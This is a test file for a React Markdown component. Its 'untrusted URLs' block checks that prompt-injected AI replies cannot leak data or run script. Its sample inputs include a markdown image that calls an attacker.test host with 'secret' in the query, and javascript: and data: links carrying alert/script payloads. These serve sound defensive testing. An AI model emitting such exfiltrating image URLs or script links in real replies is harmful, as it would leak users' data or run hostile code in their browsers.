import { describe, it, expect } from 'vitest';
import { render, screen } from '@testing-library/react';
import { Markdown } from '#/components/Markdown';

describe('Markdown', () => {
  it('renders bold, italic, and inline code as their own elements', () => {
    render(<Markdown content="**bold** _italic_ `code`" />);

    expect(screen.getByText('bold').tagName).toBe('STRONG');
    expect(screen.getByText('italic').tagName).toBe('EM');
    expect(screen.getByText('code').tagName).toBe('CODE');
  });

  it('renders a bullet list as list items', () => {
    render(<Markdown content={'- one\n- two'} />);

    expect(screen.getByText('one').closest('li')).not.toBeNull();
    expect(screen.getByText('two').closest('li')).not.toBeNull();
  });

  it('renders a heading', () => {
    render(<Markdown content="## Section" />);

    expect(screen.getByRole('heading', { level: 2, name: 'Section' })).toBeInTheDocument();
  });

  it('opens links in a new tab with a safe rel attribute', () => {
    render(<Markdown content="[docs](https://example.com)" />);

    const link = screen.getByRole('link', { name: 'docs' });
    expect(link).toHaveAttribute('href', 'https://example.com');
    expect(link).toHaveAttribute('target', '_blank');
    expect(link).toHaveAttribute('rel', 'noopener noreferrer');
  });

  // JEF-464: a prompt-injected reply must not leak data through a URL the
  // browser loads by itself, or run script from a link.
  describe('untrusted URLs', () => {
    it('renders an image as its alt text with no <img>, so nothing is fetched', () => {
      const { container } = render(
        <Markdown content="See ![chart](https://attacker.test/p.png?d=secret) here" />,
      );

      expect(container.querySelector('img')).toBeNull();
      expect(container.innerHTML).not.toContain('attacker.test');
      expect(screen.getByText('[chart]')).toBeInTheDocument();
    });

    it('renders nothing for an image with no alt text', () => {
      const { container } = render(<Markdown content="![](https://attacker.test/p.png)" />);

      expect(container.querySelector('img')).toBeNull();
      expect(container.textContent).toBe('');
    });

    it.each([
      ['javascript', '[click](javascript:alert(1))'],
      ['data', '[click](data:text/html,<script>alert(1)</script>)'],
      ['relative', '[click](/settings)'],
      ['protocol-relative', '[click](//attacker.test/x)'],
    ])('renders a %s link as plain text with no href', (_scheme, content) => {
      const { container } = render(<Markdown content={content} />);

      expect(screen.queryByRole('link')).toBeNull();
      expect(container.querySelector('[href]')).toBeNull();
      expect(screen.getByText('click')).toBeInTheDocument();
    });

    it('keeps an https link and shows the host it goes to', () => {
      render(<Markdown content="[your bank](https://attacker.test/login?d=1)" />);

      expect(screen.getByRole('link', { name: 'your bank' })).toHaveAttribute(
        'href',
        'https://attacker.test/login?d=1',
      );
      expect(screen.getByText('(attacker.test)')).toBeInTheDocument();
    });

    it('does not repeat the host when the label already names it', () => {
      const { container } = render(
        <Markdown content="[example.com/jobs](https://www.example.com/jobs) and https://example.org" />,
      );

      expect(screen.getAllByRole('link')).toHaveLength(2);
      expect(container.textContent).not.toContain('(');
    });

    it('keeps a mailto link without a host suffix', () => {
      const { container } = render(<Markdown content="[email me](mailto:hr@example.com)" />);

      expect(screen.getByRole('link', { name: 'email me' })).toHaveAttribute(
        'href',
        'mailto:hr@example.com',
      );
      expect(container.textContent).toBe('email me');
    });
  });
});
